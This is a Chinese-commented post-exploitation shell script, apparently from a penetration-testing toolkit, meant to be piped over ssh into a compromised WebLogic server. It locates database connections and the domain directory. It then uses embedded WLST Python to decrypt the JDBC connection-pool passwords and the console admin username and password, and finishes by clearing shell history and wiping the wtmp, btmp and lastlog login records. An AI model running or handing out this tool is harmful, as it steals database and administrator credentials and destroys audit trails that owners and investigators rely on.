# 后渗透，一键破解weblogic jdbc、console用户名及密码
# ssh -i YouKey userName@YouTargetIp -p targetPort < oneKeyGetSshWeblogicJdbcPswd.sh >out.txt
# https://github.com/hktalent/myhktools 
echo "查找数据库连接"
netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u
netstat -antp|grep ":3306"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):3306"|sort -u
# doman
sdomain=`ps -ef|grep domain|grep -v 'grep'|grep -Eo '([^ ]*?\.sh)'|sort -u`
if [ "${sdomain}" = "" ];
then
   tpid=`ps -ef|grep java|grep  'weblogic.Server'|awk '{print $2}'`
   sdomain=`lsof -p $tpid |grep -Eo '([^ ]+/user_projects/domains/.*domain/)'|sort -u`
fi

if [ "${sdomain}" = "" ];
then
  tmp=`ps -ef|grep java|grep -Eo "(home=[^ ]+)"|sed  's/home=//g'|sed 's/\/wlserver.*$//g'|sort -u|head -n 1`;
  sdomain=`find ${tmp} -type d -name "domains"|grep 'user_projects'`
  cd "${domains}";
  cd "user_projects";
  cd "domains";
  sdomain=`pwd`
  wlst=`find ${tmp} -type f -name "wlst.*"|sort -u`
fi

# 精准找到wlst.*， 用于破解jdbc连接池密码
if [ "${wlst}" = "" ];
then
  wlst=`ps -ef|grep domain|grep -Eo '([^ ]*?\.sh)'|grep -Eo '(.*?)/user_projects'|sed 's/user_projects//g'|xargs -I {}  find {} -type f -name "wlst.*"|sort -u`
fi

echo "wlst= ${wlst}"
echo "sdomain = ${sdomain}"

# 获得连接池配置密码加密串
echo "连接池信息"
find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}| grep -B 10 "<password-encrypted>"
enPswd=`find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
echo "jdbc pool pswd: ${enPswd}"
# 获取破解后的密码
tmpFl=`mktemp`
cat <<EOT>${tmpFl}
import os
import weblogic.security.internal.SerializedSystemIni
import weblogic.security.internal.encryption.ClearOrEncryptedService
def decrypt(domainHomeName, encryptedPwd):
    domainHomeAbsolutePath = os.path.abspath(domainHomeName)
    encryptionService = weblogic.security.internal.SerializedSystemIni.getEncryptionService(domainHomeAbsolutePath)
    ces = weblogic.security.internal.encryption.ClearOrEncryptedService(encryptionService)
    clear = ces.decrypt(encryptedPwd)
    print "jdbc pool passwd:" + clear

try:
    if len(sys.argv) == 3:
        a = sys.argv[2].split()
        for i in a:
            try:
                decrypt(sys.argv[1], i)
            except:
                pass
    else:
        print "INVALID ARGUMENTS"
except:
    print "Unexpected error: ", sys.exc_info()[0]
    dumpStack()
    raise
EOT
echo "jdbc连接池密码..."
${wlst}  ${tmpFl}  ${sdomain} "${enPswd}"
# 搜索weblogic console admin用户名及密码
export DOMAIN_HOME=${sdomain}
cd $DOMAIN_HOME/security
cd $DOMAIN_HOME/*_domain/security
echo "所有weblogic console 用户名及密码"
find $DOMAIN_HOME/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"
cat <<EOT>./xxx.py
import os
from weblogic.security.internal import *
from weblogic.security.internal.encryption import *
encryptionService = SerializedSystemIni.getEncryptionService(".")
clearOrEncryptService = ClearOrEncryptedService(encryptionService)
for i in range(1, len(sys.argv)):
   pwd = sys.argv[i]
   # Delete unnecessary escape characters
   preppwd = pwd.replace("\\\\", "")
   try:
      print "Decrypted string is: " + clearOrEncryptService.decrypt(preppwd)
   except:
      pass

EOT
echo "开始破解weblogic console 用户名及密码"
find ${sdomain} -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
rm -rf ./xxx.py

# 获取jdbc配置信息
echo "all jdbc.properties:"
find ${sdomain} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"

rm /tmp/myX.sh
rm ${tmpFl}
unset HISTFILE
history -c
history -cw
echo > ~/.bash_history
cat /dev/null > ~/.bash_history
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
>~/.bash_history
>/var/log/lastlog
>/var/log/wtmp
>/var/log/btmp

